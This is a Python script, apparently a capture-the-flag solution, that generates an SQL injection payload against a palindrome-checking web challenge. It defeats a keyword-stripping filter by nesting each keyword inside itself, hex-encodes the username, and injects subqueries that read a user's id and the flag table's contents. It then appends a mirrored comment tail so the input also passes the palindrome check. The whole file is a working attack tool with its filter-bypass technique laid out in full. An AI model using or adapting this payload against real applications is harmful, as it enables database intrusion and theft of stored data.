import binascii
import random
import string
import re

class PalindromeExploit:
    def __init__(self, username):
        self.username = username
        self.filters = ["select", "from", "union", "flag", "user", "where", "/*"]
        
    def _generate_random_id(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def _hex_encode(self, text):
        return "0x" + text.encode('utf-8').hex()

    def _obfuscate_keyword(self, keyword):
        mid = len(keyword) // 2
        return f"{keyword[:mid]}{keyword}{keyword[mid:]}"

    def _simulate_backend_sanitization(self, raw_payload):
        clean_payload = raw_payload
        for bad_word in self.filters:
            pattern = re.compile(re.escape(bad_word), re.IGNORECASE)
            clean_payload = pattern.sub("", clean_payload)
        return clean_payload

    def craft_payload(self):
        kw = {word: self._obfuscate_keyword(word) for word in self.filters}
        
        kw['users'] = "ususerers"       
        kw['username'] = "ususerername" 

        user_hex = self._hex_encode(self.username)
        fake_id = self._generate_random_id()
        
        subquery_uid = f"({kw['select']}(id){kw['from']}({kw['users']}){kw['where']}({kw['username']}={user_hex}))"
        
        subquery_flag = f"({kw['select']}(MAX({kw['flag']})){kw['from']}({kw['flag']}))"

        injection_core = f"z'),('{fake_id}',{subquery_uid},{subquery_flag})"

        sanitized_version = self._simulate_backend_sanitization(injection_core)
        mirror_string = sanitized_version[::-1]

        final_payload = f"{injection_core}#{mirror_string}"
        
        return final_payload

if __name__ == "__main__":
    target = input("Target Username: ").strip()
    
    if target:
        exploit = PalindromeExploit(target)
        result = exploit.craft_payload()
        
        print(f"\n[+] Generated Payload for user '{target}':")
        print(result)
    else:
        print("[-] Username tidak boleh kosong.")